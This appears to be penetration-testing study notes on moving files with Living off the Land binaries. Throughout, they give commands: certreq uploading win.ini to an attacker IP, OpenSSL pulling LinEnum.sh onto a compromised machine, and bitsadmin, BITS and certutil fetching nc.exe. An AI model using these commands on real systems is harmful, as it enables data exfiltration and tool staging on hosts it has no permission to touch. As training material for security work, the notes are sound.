Living off the Land binaries can be used to perform functions such as:

- Download
- Upload
- Command Execution
- File Read
- File Write
- Bypasses

# LOLBAS

To search for download and upload functions in [LOLBAS](https://lolbas-project.github.io/) we can use `/download` or `/upload`.

![[LOLBAS.png]]

**Upload win.ini to our Pwnbox using CertReq:**

```powershell
certreq.exe -Post -config http://192.168.49.128:8000/ c:\windows\win.ini
```

We can use `netcat` to receive the file.

# GTFOBins

To search for the download and upload function in [GTFOBins for Linux Binaries](https://gtfobins.github.io/), we can use `+file download` or `+file upload`.

![[GTFOBins.png]]

Let's use **OpenSSL** for demonstration

**Create Certificate in our Pwnbox:**

```sh
openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
```

**Stand up the Server in our Pwnbox:**

```sh
openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
```

Next, with the server running, we need to download the file from the compromised machine.

**Download File from the Compromised Machine:**

```sh
openssl s_client -connect 10.10.10.32:80 -quiet > LinEnum.sh
```

# Other Common Living off the Land tools

## Bitsadmin Download function

**File Download with Bitsadmin:**

```powershell
bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```

**Download:**

```powershell
Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```

## Certutil

**Download a File with Certutil:**

```powershell
certutil.exe -verifyctl -split -f http://10.10.10.32:8000/nc.exe
```

